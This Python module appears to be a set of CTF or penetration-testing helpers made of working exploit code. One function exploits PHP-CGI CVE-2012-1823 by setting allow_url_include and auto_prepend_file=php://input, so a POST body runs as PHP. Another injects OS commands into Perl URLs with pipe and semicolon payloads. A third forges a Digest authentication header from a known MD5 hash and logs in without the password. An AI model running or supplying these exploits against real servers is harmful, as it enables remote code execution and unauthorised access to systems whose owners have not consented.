import requests
import re
import binascii
import hashlib


def exploit_php_cve20121823(url, payload):
    """
    https://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html
    :param url:
    :param payload:
    :return:
    """
    exploit = '?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input'
    res = requests.post(url+exploit, payload)
    return res


def exploit_perl_direct_os_command(url, payload="exploit_perl_direct_os_command"):
    if payload == "exploit_perl_direct_os_command":
        res1 = requests.get(url + "/echo " + payload + "|")
        res2 = requests.get(url + "/;echo " + payload + "|")
        if payload in res1.text:
            print("exploit1 succeeded")
        if payload in res2.text:
            print("exploit2 succeeded")
    # requests.get(url + "/;" + payload + "|")
    return requests.get(url + "/" + payload + "|")


def resolve_digest_auth(url, user, crackmd5="c627e19450db746b739f41b64097d449"):
    """
    https://ja.wikipedia.org/wiki/Digest%E8%AA%8D%E8%A8%BC
    :param url:
    :param user:
    :param crackmd5:
    :return:
    """
    uri = re.search("https?://[^/]+(.+)", url).group(1)
    s = requests.session()
    r = s.get(url)
    if r.status_code == 401:
        header_authenticate = r.headers["www-authenticate"]
        realm = re.search(r'realm="(\S+)",', header_authenticate).group(1)
        nonce = re.search(r'nonce="(\S+)",', header_authenticate).group(1)
        algor = re.search(r'algorithm=(\S+),', header_authenticate).group(1)
        qop = re.search(r'qop="(\S+)"', header_authenticate).group(1)

        nc = "00000001"  # random
        cnonce = "9691c249745d94fc"  # random
        base = "GET"+":"+uri
        a2md5 = binascii.hexlify(hashlib.md5(base.encode("utf-8")).digest()).decode()
        base = crackmd5+":"+nonce+":"+nc+":"+cnonce+":"+qop+":"+a2md5
        response = binascii.hexlify(hashlib.md5(base.encode("utf-8")).digest()).decode()

        header_authorization = 'Digest ' +\
            'username="' + user +\
            '", realm="' + realm +\
            '", nonce="' + nonce +\
            '", uri="' + uri +\
            '", algorithm=' + algor +\
            ', response="' + response +\
            '", qop=' + qop +\
            ', nc="' + nc +\
            '", cnonce="' + cnonce + '"'

        s.headers.update({'Authorization': header_authorization})
        r = s.get(url)
    return r.text
